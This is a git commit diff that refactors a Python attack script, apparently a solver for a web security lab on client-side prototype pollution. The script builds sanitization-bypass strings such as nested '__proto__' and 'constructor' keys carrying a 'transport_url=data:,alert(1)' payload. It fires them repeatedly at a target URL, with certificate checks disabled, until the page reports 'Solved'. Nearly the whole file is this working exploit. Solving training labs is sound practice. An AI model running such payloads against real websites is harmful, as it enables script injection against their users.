ce5ac39f07c902386f90a5eb60546d429a427c07
Pierpaolo Sestito <pierpaolo.sestito.1999@gmail.com>
2023-12-09 13:27:58 +0100

    code refactoring and bug fix

--- client-side_prototype_pollution_via_flawed_sanitization.py
+++ client-side_prototype_pollution_via_flawed_sanitization.py
@@ -1,65 +1,59 @@
-from socket import socket
-
+from rich.console import Console
+from rich.text import Text
+from PIL import Image
 import typer
-evilString = "__proto__"
-import urllib
 import urllib3
-import ssl
+import warnings
+from selenium import webdriver
+
+# Disabilita tutti i warning
+warnings.filterwarnings("ignore")
+def pretty_print(url):
+    text = Text()
+    print(""">=>>=>       >===>      >=>       >=>         >=> >=======> >====>           >=>      >=>      >=>
+>=>    >=>   >=>    >=>   >=>        >=>       >=>  >=>       >=>   >=>        >=>      >=>      >=>
+ >=>       >=>        >=> >=>         >=>     >=>   >=>       >=>    >=>       >=>      >=>      >=>
+   >=>     >=>        >=> >=>          >=>   >=>    >=====>   >=>    >=>       >>       >>       >> 
+      >=>  >=>        >=> >=>           >=> >=>     >=>       >=>    >=>       >>       >>       >> 
+>=>    >=>   >=>     >=>  >=>            >===>      >=>       >=>   >=>                             
+  >=>>=>       >===>      >=======>       >=>       >=======> >====>           >=>      >=>      >=>
+                                                                                                    """)
+    text.append(f"This is the malicious payload {url}", style="bold magenta")
+    return text
 def main(url: str,number_of_times: int,file_output:str="payload"):
-    # Crea un PoolManager
+    c=Console()
     http = urllib3.PoolManager(cert_reqs='CERT_NONE', assert_hostname=False)
-
-    # Specifica l'URL di destinazione
-
-
-    # Fai una richiesta GET
-
-
-    #context = ssl.create_default_context()
-    #context.check_hostname = False
-    #context.verify_mode = ssl.CERT_NONE
     evilString = "__proto__"
     evilString2 = "constructor"
-    with open(file_output,"w") as file:
-        for i in range(0,number_of_times):
-            evilString = "__pro" + evilString + "to__"
-            evilString += "[transport_url]=data:,alert(1);"
-            url = url + "?"+evilString
-
-
-            response = http.request('GET', url)
-            # Stampa la risposta
-            #print(response.data.decode('utf-8'))
-
-            response = response.data.decode('utf-8')
+    a = False
+    for i in range(0,number_of_times):
+        evilString = "__pro" + evilString + "to__"
+        evilString += "[transport_url]=data:,alert(1);"
+        url = url + "?"+evilString
+        response = http.request('GET', url)
+        response = response.data.decode('utf-8')
             #print(response)
-            if "Solved" in response:
-                print(f"This is the malicious payload {url}")
-                break
-
-            #file.write(evilString)
-
-            evilString = evilString.replace("[transport_url]=data:,alert(1);","")
+        if "Solved" in response:
+            c.print(pretty_print(url))
+            a = True
+            break
+        evilString = evilString.replace("[transport_url]=data:,alert(1);","")
             #file.write("\n")
-
+    if not a:
         for i in range(0,number_of_times):
             evilString2 = "const"+evilString2+"ructor"
             evilString2 += "[transport_url]=data:,alert(1);"
-            url = url + "?" + evilString
-
-
+            url = url + "?" + evilString2
             response = http.request('GET', url)
             # Stampa la risposta
             # print(response.data.decode('utf-8'))
-
             response = response.data.decode('utf-8')
-            # print(response)
             if "Solved" in response:
-                print(f"This is the malicious payload {url}")
+                c.print(pretty_print(url))
+                stop = True
                 break
-            #file.write(evilString2)
             evilString2 = evilString2.replace("[transport_url]=data:,alert(1);","")
-            #file.write("\n")
+
 
 if __name__ == "__main__":
     typer.run(main)
